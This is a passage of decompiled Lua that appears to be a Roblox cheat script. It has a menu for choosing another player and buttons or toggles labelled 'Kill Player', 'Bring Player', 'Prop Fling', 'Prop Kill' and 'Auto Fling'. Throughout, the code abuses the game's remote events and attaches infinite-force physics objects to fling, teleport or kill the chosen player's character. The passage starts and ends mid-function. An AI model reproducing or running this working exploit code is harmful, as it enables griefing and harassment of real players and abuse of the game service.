        Vector3.new(-40, 4, -146)
    }
    for v419, v420 in ipairs(t18) do

        HumanoidRootPart.CFrame = CFrame.new(v420)
        task.wait(0.5)
    end
    if not p20 or not Players4:FindFirstChild(p20) then
        return
    end
    local timestamp = tick()
    while tick() - timestamp < 10 do
        local Character = LocalPlayer6.Character
        local v423 = Character and Character:FindFirstChild("HumanoidRootPart")
        local v424 = v423
        local p20_2 = Players4:FindFirstChild(p20)

        if v423 then
            v424 = p20_2 and (p20_2.Character and p20_2.Character:FindFirstChild("HumanoidRootPart"))
        end

        if not v424 then
            return
        end

        v423.CFrame = p20_2.Character.HumanoidRootPart.CFrame
        task.wait()
    end
end
t1.value32 = game:GetService("Players")
t1.value33 = t1.value32.LocalPlayer
t1.value34 = game:GetService("ReplicatedStorage")
t1.value35 = game:GetService("VirtualInputManager")
t1.value36 = game:GetService("RunService")
t1.value37 = workspace.CurrentCamera
t1.value38 = nil
t1.value39 = nil
getgenv().Target = nil
t1.value40 = t1.value33.Character
t1.value41 = t1.value40 and t1.value40:WaitForChild("Humanoid")

if t1.value40 then
    t1.value40:WaitForChild("HumanoidRootPart")
end
function t1.value42()
    local Character = t1.value33.Character

    if Character then
        local v427 = Character:FindFirstChild("Chaos.Couch") or t1.value33.Backpack:FindFirstChild("Chaos.Couch")

        if v427 then
            v427:Destroy()
        end
    end

    t1.value34:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
end
t1.value33.CharacterAdded:Connect(function(character)
    t1.value40 = character
    t1.value41 = character:WaitForChild("Humanoid")
    character:WaitForChild("HumanoidRootPart")
    t1.value42()
    t1.value41.Died:Connect(function()
        t1.value42()
    end)
end)

if t1.value41 then
    t1.value41.Died:Connect(function()
        t1.value42()
    end)
end
local function v30()
    if not t1.value38 then
        return
    end

    local t1value38 = t1.value32:FindFirstChild(t1.value38)

    if not t1value38 or not t1value38.Character then
        return
    end

    local Character = t1.value33.Character

    if not Character then
        return
    end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
    local v433 = t1value38.Character and t1value38.Character:FindFirstChild("HumanoidRootPart")

    if not Humanoid or (not HumanoidRootPart or not v433) then
        return
    end

    local HumanoidRootPartPosition = HumanoidRootPart.Position
    local vector3 = Vector3.new(145.51, -350.09, 21.58)

    t1.value34:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.2)
    t1.value34.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)

    local Couch = t1.value33.Backpack:FindFirstChild("Couch")

    if Couch then
        Couch.Parent = Character
    end

    task.wait(0.1)
    t1.value35:SendKeyEvent(true, Enum.KeyCode.F, false, game)
    task.wait(0.1)
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    Humanoid.PlatformStand = false
    t1.value37.CameraSubject = t1value38.Character:FindFirstChild("Head") or (v433 or Humanoid)

    local BodyPosition = Instance.new("BodyPosition")

    BodyPosition.Name = "BringPosition"
    BodyPosition.MaxForce = Vector3.new(1e999, 1e999, 1e999)
    BodyPosition.D = 10
    BodyPosition.P = 30000
    BodyPosition.Position = HumanoidRootPart.Position
    BodyPosition.Parent = v433
    task.spawn(function()
        local v1125
        local timestamp = tick()
        while true do
            local v1127 = tick() - timestamp < 5

            if v1127 then
                v1127 = t1value38 and (t1value38.Character and t1value38.Character:FindFirstChildOfClass("Humanoid"))
            end

            if not v1127 then
                break
            end

            local Humanoid2 = t1value38.Character:FindFirstChildOfClass("Humanoid")

            if not Humanoid2 or Humanoid2.Sit then
                break
            end

            local HumanoidRootPart2 = t1value38.Character.HumanoidRootPart
            local v1130 = HumanoidRootPart2.Position + HumanoidRootPart2.Velocity / 1.5
            local v1131 = HumanoidRootPart

            v1125 = v1125 + 50
            v1131.CFrame = CFrame.new(v1130 + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(v1125), 0, 0)
            BodyPosition.Position = HumanoidRootPart.Position + Vector3.new(2, 0, 0)
            task.wait()
        end
        BodyPosition:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        Humanoid.PlatformStand = false
        t1.value37.CameraSubject = Humanoid
        for _, descendant in pairs(Character:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.Velocity = Vector3.zero
                descendant.RotVelocity = Vector3.zero
            end
        end
        task.wait(0.1)
        HumanoidRootPart.CFrame = CFrame.new(vector3)
        task.wait(0.3)
        local Couch2 = Character:FindFirstChild("Couch")
        if Couch2 then
            Couch2.Parent = t1.value33.Backpack
        end
        task.wait(0.01)
        t1.value34.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        task.wait(0.2)
        HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPartPosition)
    end)
end
local function v31()
    if not t1.value38 then
        return
    end

    local t1value38 = t1.value32:FindFirstChild(t1.value38)

    if not t1value38 or not t1value38.Character then
        return
    end

    local Character = t1.value33.Character

    if not Character then
        return
    end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
    local v474 = t1value38.Character and t1value38.Character:FindFirstChild("HumanoidRootPart")

    if not Humanoid or (not HumanoidRootPart or not v474) then
        return
    end

    local HumanoidRootPartPosition = HumanoidRootPart.Position

    t1.value34:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.2)
    t1.value34.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)

    local Couch = t1.value33.Backpack:FindFirstChild("Couch")

    if Couch then
        Couch.Parent = Character
    end

    task.wait(0.1)
    t1.value35:SendKeyEvent(true, Enum.KeyCode.F, false, game)
    task.wait(0.1)
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    Humanoid.PlatformStand = false
    t1.value37.CameraSubject = t1value38.Character:FindFirstChild("Head") or (v474 or Humanoid)

    local BodyPosition = Instance.new("BodyPosition")

    BodyPosition.Name = "BringPosition"
    BodyPosition.MaxForce = Vector3.new(1e999, 1e999, 1e999)
    BodyPosition.D = 10
    BodyPosition.P = 30000
    BodyPosition.Position = HumanoidRootPart.Position
    BodyPosition.Parent = v474
    task.spawn(function()
        local v1135
        local timestamp = tick()
        while true do
            local v1137 = tick() - timestamp < 5

            if v1137 then
                v1137 = t1value38 and (t1value38.Character and t1value38.Character:FindFirstChildOfClass("Humanoid"))
            end

            if not v1137 then
                break
            end

            local Humanoid3 = t1value38.Character:FindFirstChildOfClass("Humanoid")

            if not Humanoid3 or Humanoid3.Sit then
                break
            end

            local HumanoidRootPart3 = t1value38.Character.HumanoidRootPart
            local v1140 = HumanoidRootPart3.Position + HumanoidRootPart3.Velocity / 1.5

            v1135 = v1135 + 50
            HumanoidRootPart.CFrame = CFrame.new(v1140 + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(v1135), 0, 0)
            BodyPosition.Position = HumanoidRootPart.Position + Vector3.new(2, 0, 0)
            task.wait()
        end
        BodyPosition:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        Humanoid.PlatformStand = false
        t1.value37.CameraSubject = Humanoid
        for _, descendant in pairs(Character:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.Velocity = Vector3.zero
                descendant.RotVelocity = Vector3.zero
            end
        end
        task.wait(0.1)
        HumanoidRootPart.Anchored = true
        HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPartPosition)
        task.wait(0.001)
        HumanoidRootPart.Anchored = false
        task.wait(0.7)
        local Couch3 = Character:FindFirstChild("Couch")
        if Couch3 then
            Couch3.Parent = t1.value33.Backpack
        end
        task.wait(0.001)
        t1.value34.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    end)
end
function t1.value43()
    local Target = t1.value32:FindFirstChild(getgenv().Target)

    if not Target then
        return
    end

    if not Target.Character or not Target.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local t19 = {
        [1] = "ClearAllTools"
    }
    local v455 = t1.value34.RE["1Clea1rTool1s"]
    local t20 = { unpack(t19) }

    v455:FireServer(v2(t20))

    local value34 = t1.value34
    local t21 = {
        [1] = "PickingTools",
        [2] = "Couch"
    }
    local v459 = value34.RE:FindFirstChild("1Too1l")
    local t22 = { unpack(t21) }

    v459:InvokeServer(v2(t22))

    local Couch = t1.value33.Backpack:WaitForChild("Couch", 2)

    if not Couch then
        return
    end

    Couch.Name = "Chaos.Couch"

    local Seat1 = Couch:FindFirstChild("Seat1")
    local Seat2 = Couch:FindFirstChild("Seat2")
    local v464 = Seat1
    local Handle = Couch:FindFirstChild("Handle")

    if Seat1 then
        v464 = Seat2 and Handle
    end

    if v464 then
        Seat1.Disabled = true
        Seat2.Disabled = true
        Handle.Name = "Handle "
        Couch.Parent = t1.value33.Character

        local BodyVelocity = Instance.new("BodyVelocity", Seat1)

        BodyVelocity.MaxForce = Vector3.new(1e999, 1e999, 1e999)
        BodyVelocity.P = 1250
        BodyVelocity.Velocity = Vector3.new(0, 0, 0)
        BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

        if Target.Character and Target.Character.Humanoid then
            if Target.Character.Humanoid.Sit ~= true then
            end
        end

        repeat
            for _ = 1, 35 do
                local t23 = {
                    x = 0,
                    y = 0,
                    z = 0
                }
                local v469 = Target.Character and Target.Character.HumanoidRootPart

                if not v469 then
                    break
                end

                t23.x = v469.Position.X + v469.Velocity.X / 2
                t23.y = v469.Position.Y + v469.Velocity.Y / 2
                t23.z = v469.Position.Z + v469.Velocity.Z / 2
                Seat1.CFrame = CFrame.new(Vector3.new(t23.x, t23.y, t23.z)) * CFrame.new(-2, 2, 0)
                task.wait()
            end

            BodyVelocity:Destroy()
            Couch.Parent = t1.value33.Backpack
            task.wait()
            Couch:FindFirstChild("Handle ").Name = "Handle"
            task.wait(0.2)
            Couch.Parent = t1.value33.Character
            task.wait()
            Couch.Parent = t1.value33.Backpack
            Couch.Handle.Name = "Handle "
            task.wait(0.2)
            Couch.Parent = t1.value33.Character
            BodyVelocity = Instance.new("BodyVelocity", Seat1)
            BodyVelocity.MaxForce = Vector3.new(1e999, 1e999, 1e999)
            BodyVelocity.P = 1250
            BodyVelocity.Velocity = Vector3.new(0, 0, 0)
            BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
        until Target.Character and (Target.Character.Humanoid and Target.Character.Humanoid.Sit == true)

        task.wait()
        BodyVelocity:Destroy()
        Couch.Parent = t1.value33.Backpack
        task.wait()
        Couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.3)
        Couch.Parent = t1.value33.Character
        task.wait(0.3)
        Couch.Grip = CFrame.new(Vector3.new(0, 0, 0))
        task.wait(0.3)
        t1.value34.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

        return
    end
end
function t1.value44()
    local Target = t1.value32:FindFirstChild(getgenv().Target)

    if not Target then
        return
    end

    if not Target.Character or not Target.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local value34 = t1.value34
    local t24 = {
        [1] = "ClearAllTools"
    }
    local v481 = value34.RE["1Clea1rTool1s"]
    local t25 = { unpack(t24) }

    v481:FireServer(v2(t25))

    local t26 = {
        [1] = "PickingTools",
        [2] = "Couch"
    }
    local v484 = t1.value34.RE:FindFirstChild("1Too1l")
    local t27 = { unpack(t26) }

    v484:InvokeServer(v2(t27))

    local Couch = t1.value33.Backpack:WaitForChild("Couch", 2)

    if not Couch then
        return
    end

    Couch.Name = "Chaos.Couch"

    local Seat1 = Couch:FindFirstChild("Seat1")
    local Seat2 = Couch:FindFirstChild("Seat2")
    local v489 = Seat1
    local Handle = Couch:FindFirstChild("Handle")

    if Seat1 then
        v489 = Seat2 and Handle
    end

    if v489 then
        Seat1.Disabled = true
        Seat2.Disabled = true
        Handle.Name = "Handle "
        Couch.Parent = t1.value33.Character

        local BodyVelocity = Instance.new("BodyVelocity", Seat1)

        BodyVelocity.MaxForce = Vector3.new(1e999, 1e999, 1e999)
        BodyVelocity.P = 1250
        BodyVelocity.Velocity = Vector3.new(0, 0, 0)
        BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

        if Target.Character and Target.Character.Humanoid then
            if Target.Character.Humanoid.Sit ~= true then
            end
        end

        repeat
            for _ = 1, 35 do
                local t28 = {
                    x = 0,
                    y = 0,
                    z = 0
                }
                local v494 = Target.Character and Target.Character.HumanoidRootPart

                if not v494 then
                    break
                end

                t28.x = v494.Position.X + v494.Velocity.X / 2
                t28.y = v494.Position.Y + v494.Velocity.Y / 2
                t28.z = v494.Position.Z + v494.Velocity.Z / 2
                Seat1.CFrame = CFrame.new(Vector3.new(t28.x, t28.y, t28.z)) * CFrame.new(-2, 2, 0)
                task.wait()
            end

            BodyVelocity:Destroy()
            Couch.Parent = t1.value33.Backpack
            task.wait()
            Couch:FindFirstChild("Handle ").Name = "Handle"
            task.wait(0.2)
            Couch.Parent = t1.value33.Character
            task.wait()
            Couch.Parent = t1.value33.Backpack
            Couch.Handle.Name = "Handle "
            task.wait(0.2)
            Couch.Parent = t1.value33.Character
            BodyVelocity = Instance.new("BodyVelocity", Seat1)
            BodyVelocity.MaxForce = Vector3.new(1e999, 1e999, 1e999)
            BodyVelocity.P = 1250
            BodyVelocity.Velocity = Vector3.new(0, 0, 0)
            BodyVelocity.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
        until Target.Character and (Target.Character.Humanoid and Target.Character.Humanoid.Sit == true)

        task.wait()
        Couch.Parent = t1.value33.Backpack
        Seat1.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
        Seat2.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
        Couch.Parent = t1.value33.Character
        task.wait(0.1)
        Couch.Parent = t1.value33.Backpack
        task.wait(2)

        local v495 = Seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")

        if v495 then
            v495:Destroy()
        end

        t1.value34.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

        return
    end
end
local v32 = (function()
    local players = t1.value32:GetPlayers()
    local t29 = {}

    for _, v in ipairs(players) do
        if v ~= t1.value33 then
            table.insert(t29, v.Name)
        end
    end

    return t29
end)()
t1.value45 = v29:AddDropdown({
    Name = "Select Player",
    Options = v32,
    Default = "",
    Callback = function(p21)
    t1.value38 = p21
    getgenv().Target = p21
end
})
v29:AddButton({
    Name = "Update Player List",
    Callback = function()
    local t30 = {}
    local players = t1.value32:GetPlayers()

    if t1.value45 and #players > 0 then

        for v505, v506 in ipairs(players) do

            if v506.Name ~= t1.value33.Name then
                table.insert(t30, v506.Name)
            end
        end
        t1.value45:Set(t30)
        local value38 = t1.value38
        if value38 then
            value38 = not t1.value32:FindFirstChild(t1.value38)
        end
        if value38 then
            t1.value38 = nil
            getgenv().Target = nil
            t1.value45:SetValue("")
        end
    end
end
})
v29:AddButton({
    Name = "Teleport to Player",
    Callback = function()
    if not t1.value38 or not t1.value32:FindFirstChild(t1.value38) then
        return
    end

    local Character = t1.value33.Character
    local v509 = Character and Character:FindFirstChild("HumanoidRootPart")

    if not v509 then
        return
    end

    local t1value38 = t1.value32:FindFirstChild(t1.value38)

    if t1value38 and (t1value38.Character and t1value38.Character:FindFirstChild("HumanoidRootPart")) then
        v509.CFrame = t1value38.Character.HumanoidRootPart.CFrame
    end
end
})
v29:AddToggle({
    Name = "View Player",
    Default = false,
    Callback = function(p22)
    local CurrentCamera = workspace.CurrentCamera

    local function v513()
        if p22 then
            local t1value38 = t1.value32:FindFirstChild(t1.value38)

            if t1value38 and t1value38.Character then
                local Humanoid = t1value38.Character:FindFirstChild("Humanoid")

                if Humanoid then
                    CurrentCamera.CameraSubject = Humanoid

                    return
                end
            end
        elseif t1.value33.Character then
            local Humanoid = t1.value33.Character:FindFirstChild("Humanoid")

            if Humanoid then
                CurrentCamera.CameraSubject = Humanoid
            end
        end
    end

    if p22 then
        if not getgenv().CameraConnection then
            getgenv().CameraConnection = t1.value36.Heartbeat:Connect(v513)

            return
        end
    else
        if getgenv().CameraConnection then
            getgenv().CameraConnection:Disconnect()
            getgenv().CameraConnection = nil
        end

        v513()
    end
end
})
v29:AddSection({
    Name = "Methods"
})
v29:AddDropdown({
    Name = "Select Killing Method",
    Options = {
        "Couch",
        "Couch without going to the target"
    },
    Default = "Couch",
    Callback = function(p23)
    t1.value39 = p23
end
})
v29:AddButton({
    Name = "Kill Player",
    Callback = function()
    local v515 = not t1.value38

    if not v515 then
        v515 = not t1.value32:FindFirstChild(t1.value38)
    end

    if v515 then
        return
    end

    if t1.value39 == "Couch" then
        v30()

        return
    end

    if t1.value39 == "Couch without going to the target" then
        t1.value44()

        return
    end

    local Character = t1.value33.Character
    local v517 = Character and Character:FindFirstChild("HumanoidRootPart")

    if not v517 then
        return
    end

    local CFrame2 = v517.CFrame

    local function v519()
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if Vehicles then
            return Vehicles:FindFirstChild(t1.value33.Name .. "Car")
        end

        return nil
    end

    local u520 = v519()

    if not u520 then
        v517.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
        task.wait(0.5)

        local RE = t1.value34:FindFirstChild("RE")

        if RE and RE:FindFirstChild("1Ca1r") then
            RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
        end

        task.wait(1)
        u520 = v519()
    end

    if u520 then
        local v522 = u520:FindFirstChild("Body") and u520.Body:FindFirstChild("VehicleSeat")

        if v522 and (Character:FindFirstChildOfClass("Humanoid") and not Character.Humanoid.Sit) then
            if not Character.Humanoid.Sit then
                local _ = u520.Parent
            end

            repeat
                v517.CFrame = v522.CFrame * CFrame.new(0, 2, 0)
                task.wait()
            until Character.Humanoid.Sit or not u520.Parent

            if Character.Humanoid.Sit or not u520.Parent then
                for _, child in pairs(u520.Body:GetChildren()) do
                    if child:IsA("Seat") then
                        child.CanTouch = false
                    end
                end
            end
        end
    end

    spawn(function()
        while true do
            if t1.value38 then
                local t1value38 = t1.value32:FindFirstChild(t1.value38)

                if t1value38 and (t1value38.Character and t1value38.Character:FindFirstChild("HumanoidRootPart")) then
                    local Humanoid = t1value38.Character:FindFirstChildOfClass("Humanoid")

                    if Humanoid and Humanoid.Sit then
                        if Character.Humanoid then
                            u520:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))
                            task.wait(0.2)

                            local v1150 = Character and Character:FindFirstChildWhichIsA("Humanoid")

                            if v1150 then
                                v1150:ChangeState(Enum.HumanoidStateType.Jumping)
                            end

                            task.wait(0.5)
                            v517.CFrame = CFrame2
                        end

                        return
                    end

                    local HumanoidRootPart = t1value38.Character.HumanoidRootPart
                    local v1152 = tick() * 35
                    local v1153 = math.sin(v1152) * 4
                    local v1154 = math.cos(v1152) * 20

                    u520:SetPrimaryPartCFrame(HumanoidRootPart.CFrame * CFrame.new(v1153, 0, v1154))
                end
            end

            t1.value36.RenderStepped:Wait()
        end
    end)
end
})
v29:AddButton({
    Name = "Bring Player",
    Callback = function()
    local v526 = not t1.value38

    if not v526 then
        v526 = not t1.value32:FindFirstChild(t1.value38)
    end

    if v526 then
        return
    end

    if t1.value39 == "Couch" then
        v31()

        return
    end

    if t1.value39 == "Couch without going to the target" then
        t1.value43()

        return
    end

    local Character = t1.value33.Character
    local v528 = Character and Character:FindFirstChild("HumanoidRootPart")

    if not v528 then
        return
    end

    local CFrame3 = v528.CFrame

    local function v530()
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if Vehicles then
            return Vehicles:FindFirstChild(t1.value33.Name .. "Car")
        end

        return nil
    end

    local u531 = v530()

    if not u531 then
        v528.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
        task.wait(0.5)

        local RE = t1.value34:FindFirstChild("RE")

        if RE and RE:FindFirstChild("1Ca1r") then
            RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
        end

        task.wait(1)
        u531 = v530()
    end

    if u531 then
        local v533 = u531:FindFirstChild("Body") and u531.Body:FindFirstChild("VehicleSeat")

        if v533 and (Character:FindFirstChildOfClass("Humanoid") and not Character.Humanoid.Sit) then
            if not Character.Humanoid.Sit then
                local _ = u531.Parent
            end

            repeat
                v528.CFrame = v533.CFrame * CFrame.new(0, 2, 0)
                task.wait()
            until Character.Humanoid.Sit or not u531.Parent
        end
    end

    spawn(function()
        while true do
            if t1.value38 then
                local t1value38 = t1.value32:FindFirstChild(t1.value38)

                if t1value38 and (t1value38.Character and t1value38.Character:FindFirstChild("HumanoidRootPart")) then
                    local Humanoid = t1value38.Character:FindFirstChildOfClass("Humanoid")

                    if Humanoid and Humanoid.Sit then
                        if Character.Humanoid then
                            u531:SetPrimaryPartCFrame(CFrame3)
                            task.wait(0.7)

                            local value34 = t1.value34
                            local t31 = {
                                    [1] = "DeleteAllVehicles"
                                }

                            value34.RE:FindFirstChild("1Ca1r"):FireServer(unpack(t31))
                        end

                        return
                    end

                    local HumanoidRootPart = t1value38.Character.HumanoidRootPart
                    local v1161 = tick() * 35
                    local v1162 = math.sin(v1161)
                    local _math = math
                    local v1164 = v1162 * 4
                    local v1165 = _math.cos(v1161) * 20

                    u531:SetPrimaryPartCFrame(HumanoidRootPart.CFrame * CFrame.new(v1164, 0, v1165))
                end
            end

            t1.value36.RenderStepped:Wait()
        end
    end)
end
})
v29:AddSection({
    Name = "Prop Method"
})
t1.value46 = game:GetService("Players")
t1.value47 = game:GetService("RunService")
t1.value48 = game:GetService("ReplicatedStorage")
t1.value49 = t1.value46.LocalPlayer
t1.value50 = nil
t1.value51 = nil
t1.value52 = nil
t1.value53 = nil
t1.value54 = nil
t1.value55 = false
function t1.value56()
    local t32 = {}

    for _, player in ipairs(t1.value46:GetPlayers()) do
        if player ~= t1.value49 then
            table.insert(t32, player.Name)
        end
    end

    return t32
end
local v33 = t1.value56()
t1.value57 = v29:AddDropdown({
    Name = "Select Player",
    Options = v33,
    Default = "",
    Callback = function(p24)
    t1.value50 = p24
    getgenv().Target = p24
end
})
t1.value46.PlayerAdded:Connect(function()
    local value57 = t1.value57
    local t33 = { t1.value56() }

    value57:NewOptions(v2(t33))
end)
t1.value46.PlayerRemoving:Connect(function()
    local value57 = t1.value57
    local t34 = { t1.value56() }

    value57:NewOptions(v2(t34))

    if t1.value50 and not t1.value46:FindFirstChild(t1.value50) then
        t1.value50 = nil
    end
end)
t1.value58 = {}
t1.value59 = nil
t1.value59 = 0
t1.value60 = nil
function t1.value60()
    local timestamp = tick()

    if timestamp - t1.value59 < 0.5 and #t1.value58 > 0 then
        return t1.value58
    end

    t1.value58 = {}

    local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")

    if not WorkspaceCom then
        return t1.value58
    end

    local value49 = t1.value49
    local GetChildren = WorkspaceCom.GetChildren
    local value49Name = value49.Name

    for _, v in ipairs(GetChildren(WorkspaceCom)) do
        local GetChildren2 = v.GetChildren

        for _, v3 in ipairs(GetChildren2(v)) do
            if v3.Name:find(value49Name) and v3:FindFirstChild("SetCurrentCFrame") then
                table.insert(t1.value58, v3)
            end
        end
    end

    t1.value59 = timestamp

    return t1.value58
end
function t1.value61(p25)
    local v554 = t1.value60()

    for _, v in ipairs(v554) do
        local v557 = v

        task.spawn(function()
            pcall(function()
                v557.SetCurrentCFrame:InvokeServer(p25)
            end)
        end)
    end
end
function t1.value62()
    pcall(function()
        t1.value48.RE:FindFirstChild("1Clea1rTool1s"):FireServer("ClearAllProps")
    end)
end
function t1.value63()
    if not t1.value50 then
        return nil
    end

    return t1.value46:FindFirstChild(t1.value50)
end
v29:AddToggle({
    Name = "Prop Fling",
    Default = false,
    Callback = function(p26)
    if t1.value51 then
        t1.value51:Disconnect()
    end

    if not p26 then
        return
    end

    t1.value47.Heartbeat:Connect(function()
        local v1166 = t1.value63()

        if not v1166 or not v1166.Character then
            return
        end

        local HumanoidRootPart = v1166.Character:FindFirstChild("HumanoidRootPart")
        local Humanoid = v1166.Character:FindFirstChild("Humanoid")

        if not HumanoidRootPart or not Humanoid then
            return
        end

        if Humanoid.Sit then
            t1.value61(CFrame.new(1082537, 81322368, -4719626.5))
            task.delay(1.5, t1.value62)

            return
        end

        t1.value61(HumanoidRootPart.CFrame * CFrame.new(0, -(Humanoid.HipHeight + 2), 0))
    end)
end
})
v29:AddToggle({
    Name = "Prop Bring",
    Default = false,
    Callback = function(p27)
    if t1.value52 then
        t1.value52:Disconnect()
    end

    if not p27 then
        return
    end

    t1.value47.Heartbeat:Connect(function()
        local v1169 = t1.value63()

        if not v1169 or not v1169.Character then
            return
        end

        local HumanoidRootPart = v1169.Character:FindFirstChild("HumanoidRootPart")
        local Humanoid = v1169.Character:FindFirstChild("Humanoid")
        local Character = t1.value49.Character

        if not HumanoidRootPart or not Humanoid then
            return
        end

        if not Character or not Character:FindFirstChild("HumanoidRootPart") then
            return
        end

        if Humanoid.Sit then
            t1.value61(Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3))
            task.delay(1.5, t1.value62)

            return
        end

        t1.value61(HumanoidRootPart.CFrame * CFrame.new(0, -(Humanoid.HipHeight + 2), 0))
    end)
end
})
v29:AddToggle({
    Name = "Prop Kill",
    Default = false,
    Callback = function(p28)
    if t1.value53 then
        t1.value53:Disconnect()
    end

    if not p28 then
        return
    end

    t1.value47.Heartbeat:Connect(function()
        local v1173 = t1.value63()

        if not v1173 or not v1173.Character then
            return
        end

        local HumanoidRootPart = v1173.Character:FindFirstChild("HumanoidRootPart")
        local Humanoid = v1173.Character:FindFirstChild("Humanoid")

        if not HumanoidRootPart or not Humanoid then
            return
        end

        if Humanoid.Sit then
            t1.value61(CFrame.new(216.457, -1338.86, -477.942))
            task.delay(1.5, t1.value62)

            return
        end

        t1.value61(HumanoidRootPart.CFrame * CFrame.new(0, -(Humanoid.HipHeight + 2), 0))
    end)
end
})
v29:AddToggle({
    Name = "Prop RGB",
    Default = false,
    Callback = function(p29)
    t1.value55 = p29

    if t1.value54 then
        t1.value54:Disconnect()
    end

    if not t1.value55 then
        return
    end

    t1.value47.Heartbeat:Connect(function()
        if not t1.value55 then
            return
        end

        local v1176 = tick() * 0.5 % 1
        local color3_6 = Color3.fromHSV(v1176, 1, 1)
        local v1178 = t1.value60()

        for _, v in ipairs(v1178) do
            local v1181 = v

            if v1181 and (v1181.Parent and v1181:FindFirstChild("ChangePropColor")) then
                pcall(function()
                    v1181.ChangePropColor:InvokeServer(color3_6)
                end)
            end
        end

        pcall(function()
            t1.value49.PlayerGui:WaitForChild("NoResetGUIHandler"):WaitForChild("PropColorPicker"):WaitForChild("SetColor"):FireServer(color3_6)
        end)
    end)
end
})
t1.value64 = nil
v29:AddToggle({
    Name = "Orbit Prop",
    Default = false,
    Callback = function(p30)
    if t1.value64 then
        t1.value64:Disconnect()
    end

    if not p30 then
        return
    end

    local n8 = 0

    t1.value47.Heartbeat:Connect(function(dt)
        local Character = t1.value49.Character

        if not Character then
            return
        end

        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")

        if not HumanoidRootPart then
            return
        end

        local v1185 = t1.value60()

        if not v1185 or #v1185 == 0 then
            return
        end

        local v1186 = dt * 2

        n8 = n8 + v1186

        local v1187 = 6.283185307179586 / #v1185

        for i, v in ipairs(v1185) do
            if v and v.Parent then
                local v1190 = n8 + i * v1187
                local v1191 = math.cos(v1190) * 6
                local v1192 = math.sin(v1190) * 6
                local v1193 = HumanoidRootPart.Position + Vector3.new(v1191, -3, v1192)
                local cFrame = CFrame.lookAt(v1193, HumanoidRootPart.Position)
                local SetCurrentCFrame = v:FindFirstChild("SetCurrentCFrame")

                if SetCurrentCFrame then
                    pcall(function()
                        SetCurrentCFrame:InvokeServer(cFrame)
                    end)
                end
            end
        end
    end)
end
})
v29:AddSection({
    Name = "Auto Method"
})
v29:AddToggle({
    Name = "Auto Fling",
    Default = false,
    Callback = function(p31)
    flingActive = p31

    if p31 then
        p31 = t1.value50
    end

    if p31 then
        local t1value50 = t1.value46:FindFirstChild(t1.value50)

        if not t1value50 or not t1value50.Character then
            return
        end

        local v566 = t1.value49.Character and t1.value49.Character:FindFirstChild("HumanoidRootPart")
        local v567 = t1value50.Character and t1value50.Character:FindFirstChild("HumanoidRootPart")

        if not v566 or not v567 then
            return
        end

        local Character = t1.value49.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local CFrame4 = v566.CFrame
        local v571 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s")
        local t35 = { unpack({ "ClearAllTools" }) }

        v571:FireServer(v2(t35))
        task.wait(0.2)

        local t36 = {
                [1] = "PickingTools",
                [2] = "Couch"
            }

        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(t36))
        task.wait(0.3)

        local Couch = t1.value49.Backpack:FindFirstChild("Couch")

        if Couch then
            Couch.Parent = Character
        end

        task.wait(0.2)
        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
        task.wait(0.25)
        workspace.FallenPartsDestroyHeight = (0/0)

        local BodyVelocity = Instance.new("BodyVelocity")

        BodyVelocity.Name = "FlingForce"
        BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
        BodyVelocity.MaxForce = Vector3.new(1e999, 1e999, 1e999)
        BodyVelocity.Parent = v566
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        Humanoid.PlatformStand = false
        t1.value37.CameraSubject = t1value50.Character:FindFirstChild("Head") or (v567 or Humanoid)
        task.spawn(function()
            local v1196
